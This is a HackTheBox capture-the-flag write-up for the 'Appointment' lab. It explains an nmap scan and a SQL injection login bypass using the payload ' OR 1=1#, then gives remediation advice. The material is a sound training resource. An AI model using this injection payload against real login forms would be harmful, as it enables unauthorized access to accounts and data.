# Appointment - HackTheBox Writeup 📅

## 🚩 Room Information
- **Platform:** [HackTheBox](https://app.hackthebox.com/)
- **Track:** Starting Point - Tier 0
- **Difficulty:** Very Easy
- **Category:** Web Exploitation / SQL Injection
- **Status:** ✅ Completed

---

## 🎓 Learning Objectives
- Understanding Web Application Authentication mechanisms.
- Identifying and exploiting SQL Injection (**SQLi**) vulnerabilities.
- Performing authentication bypass techniques using boolean logic manipulation.

---

## 🧠 Knowledge Required
- Basic HTTP web concepts.
- Understanding how SQL authentication queries process inputs.

---

## 🔍 Step-by-Step Walkthrough

### 1. Web Reconnaissance
Scan the target for active web server ports:
```bash
nmap -sV -p 80 <TARGET_IP>
```
* **Discovered Open Port:** `80/tcp` running `Apache httpd 2.4.38`.

Navigate to `http://<TARGET_IP>/` in a web browser to reveal an admin login screen.

### 2. Vulnerability Analysis
The backend database query for authentication typically resembles:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
If input sanitization is missing, injecting raw SQL syntax can force the query condition to evaluate to `TRUE`.

### 3. Exploitation (Authentication Bypass)
Submit the following payload into the **Username** field:
- **Username:** `' OR 1=1#` (or `' OR 1=1--`)
- **Password:** `admin` *(or any arbitrary text)*

The resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1#' AND password = '...';
```
Since `1=1` is always true and `#` comments out the rest of the query, the database authenticates the request as the first user (typically `admin`).

### 4. Flag Retrieval
Upon successful bypass, the application redirects to the administrative dashboard displaying the root flag.

---

## 🛡️ Remediation & Key Takeaways
- **Use Parameterized Queries:** Always use Prepared Statements (Parameterized Queries) to isolate data from SQL code execution.
- **Input Validation:** Enforce strict server-side validation and sanitization on all user input fields.

---
*Based on HackTheBox content. Compiled by [Amit Padhan](https://github.com/amitpadhan525)*
